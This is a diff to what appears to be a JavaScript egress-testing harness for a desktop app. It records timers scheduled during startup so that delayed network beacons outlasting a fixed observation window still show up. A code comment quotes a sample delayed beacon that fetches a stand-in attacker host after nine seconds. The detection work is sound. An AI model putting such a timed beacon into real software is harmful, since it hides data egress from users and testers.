@@ -703,6 +703,30 @@ if (typeof process.getBuiltinModule === 'function') {
   };
 }
 
+// A fixed observation window can always be outwaited: `setTimeout(() =>
+// fetch('https://telemetry.evil.example/late'), 9000)` produced no finding at
+// 4200ms, and raising the number only moves the goalpost — a beacon at
+// startup+60s would still be silent, and it is no less egress for being late.
+//
+// So census the timers the app SCHEDULES as well. A recorded call answers "what
+// did it dial?"; what is still armed when the window closes answers "what is it
+// still going to do?", which no wait can reach. Installed BEFORE the require:
+// patched afterwards it would miss every timer the app arms while loading, and
+// createWindow's update-check timer among them.
+const scheduledTimers = [];
+const realSetTimeout = globalThis.setTimeout;
+const realSetInterval = globalThis.setInterval;
+globalThis.setTimeout = function (fn, ms, ...rest) {
+  const rec = { ms: Number(ms) || 0, fired: false, kind: 'timeout' };
+  scheduledTimers.push(rec);
+  return realSetTimeout.call(this, (...a) => { rec.fired = true; return fn && fn(...a); }, ms, ...rest);
+};
+// An interval NEVER stops being armed, so it is always a pending timer.
+globalThis.setInterval = function (fn, ms, ...rest) {
+  scheduledTimers.push({ ms: Number(ms) || 0, fired: false, kind: 'interval' });
+  return realSetInterval.call(this, fn, ms, ...rest);
+};
+
 require(path.resolve(mainCjs));
 
 // A lifecycle handler that throws under the fake has NOT run to completion, so
@@ -871,7 +895,7 @@ if (mode === 'egress') {
   // The update check is scheduled 3000ms after the first window opens, so wait
   // past it. The test asserts the fetch DID happen: a run that records nothing
   // would otherwise "prove" the app makes no calls by never letting it try.
-  const done = () => {
+  const done = (pendingTimers = []) => {
     assertBooted();
     out({
       networkCalls,
@@ -882,10 +906,14 @@ if (mode === 'egress') {
       instrumented,
       windowOptions,
       dialogsShown,
+      pendingTimers,
     });
   };
   fire('browser-window-created', {}, { webContents: mainContents });
-  setTimeout(done, 4200);
+
+  // See the timer census installed before the app loads, above: a fixed window
+  // can be outwaited, so what is still ARMED at report time is a finding too.
+  realSetTimeout(() => done(scheduledTimers.filter((t) => !t.fired).map((t) => t.ms)), 4200);
 }
 
 if (mode === 'openexternal') {
